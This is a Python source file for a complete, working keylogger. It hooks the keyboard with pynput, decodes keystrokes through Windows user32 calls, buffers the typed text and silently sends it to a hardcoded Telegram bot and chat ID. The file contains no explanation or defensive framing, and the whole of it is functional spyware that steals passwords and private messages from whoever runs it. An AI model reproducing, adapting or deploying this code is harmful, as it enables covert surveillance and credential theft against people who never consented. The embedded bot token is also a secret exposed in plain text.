
import ctypes
import sys
import threading
import time
from datetime import datetime, timedelta
from queue import Empty, Queue
from typing import List, Optional

import requests
from pynput import keyboard

BOT_TOKEN = "7756196800:AAE_2EBn1gp9ZZTUatjsVdPt68DLV3usEOU"
CHAT_ID = "7075072566"

def send_key(key: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": key}
    try:
        requests.post(url, data=params)
    except Exception:
        pass

_user32 = None
if sys.platform == "win32":
    _user32 = ctypes.WinDLL("user32", use_last_error=True)


def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
    if _user32 is None:
        return None

    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    scan_code = _user32.MapVirtualKeyW(vk, 0)
    if scan_code == 0:
        return None

    keyboard_state = (ctypes.c_uint8 * 256)()
    for virtual_key in range(256):
        keyboard_state[virtual_key] = _user32.GetKeyState(virtual_key) & 0xFF

    buffer = ctypes.create_unicode_buffer(8)
    layout = _user32.GetKeyboardLayout(0)
    result = _user32.ToUnicodeEx(
        vk,
        scan_code,
        keyboard_state,
        buffer,
        len(buffer),
        0,
        layout,
    )

    if result == -1:
        _user32.ToUnicodeEx(
            vk,
            scan_code,
            keyboard_state,
            buffer,
            len(buffer),
            0,
            layout,
        )
        return None

    if result > 0:
        return buffer.value[:result]

    return None


def key_to_str(key):
    if key in {
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.alt,
        keyboard.Key.alt_gr,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
    }:
        return None
    if key == keyboard.Key.caps_lock:
        return "{caps_lock}"
    if key == keyboard.Key.enter:
        return "{return}"
    if key == keyboard.Key.backspace:
        return "{backspace}"
    if key == keyboard.Key.tab:
        return "{tab}"
    if key == keyboard.Key.space:
        return " "
    if key == keyboard.Key.esc:
        return "{escape}"
    if isinstance(key, keyboard.KeyCode):
        if key.char is not None:
            return key.char
        translated = _translate_keycode_windows(key)
        if translated:
            return translated
    return None

def worker(q: Queue):
    count = 0
    window_start = datetime.now()
    buffer: List[str] = []
    last_input_monotonic: Optional[float] = None

    def send_buffer():
        nonlocal count, window_start, buffer, last_input_monotonic
        if not buffer:
            return
        now = datetime.now()
        if now - window_start >= timedelta(seconds=1):
            window_start = now
            count = 0
        if count >= 30:
            sleep_time = (window_start + timedelta(seconds=1) - now).total_seconds()
            if sleep_time > 0:
                time.sleep(sleep_time)
            window_start = datetime.now()
            count = 0
        send_key("".join(buffer))
        count += 1
        buffer.clear()
        last_input_monotonic = None

    while True:
        try:
            key = q.get(timeout=0.5)
        except Empty:
            if (
                buffer
                and last_input_monotonic is not None
                and time.monotonic() - last_input_monotonic >= 10
            ):
                send_buffer()
            continue

        now_monotonic = time.monotonic()

        if key == "{backspace}":
            if buffer:
                buffer.pop()
                last_input_monotonic = now_monotonic
            continue

        buffer.append(key)
        last_input_monotonic = now_monotonic

        if key in (" ", "{return}"):
            send_buffer()

def on_press(key):
    key_str = key_to_str(key)
    if key_str is not None:
        q.put(key_str)

q = Queue()
threading.Thread(target=worker, args=(q,), daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
